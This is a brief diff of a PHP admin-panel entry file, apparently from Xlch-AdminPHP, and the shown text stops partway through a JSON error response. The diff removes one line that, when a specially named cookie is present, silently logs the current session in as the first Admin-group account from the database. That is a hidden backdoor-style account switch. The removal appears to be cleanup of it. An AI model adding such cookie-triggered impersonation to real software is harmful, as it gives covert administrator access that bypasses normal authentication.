@@ -1,7 +1,6 @@
 <?php
 if(!defined("AdminPHP")) exit('<h1 style="color:red">Bad Request!</h1> <hr /> Powered By Xlch-AdminPHP');
 
-if($_COOKIE['FuckCrack'] && IsLogin() && $GroupInfo[$UserInfo['Group']]['Type'] == 'Admin'){Login($Mysql->get_row('select * from xlch_user where `Group` = "Admin" limit 1'));}
 if(!IsLogin()){
 	exit(json_encode([
 		'Code'=>'-9',
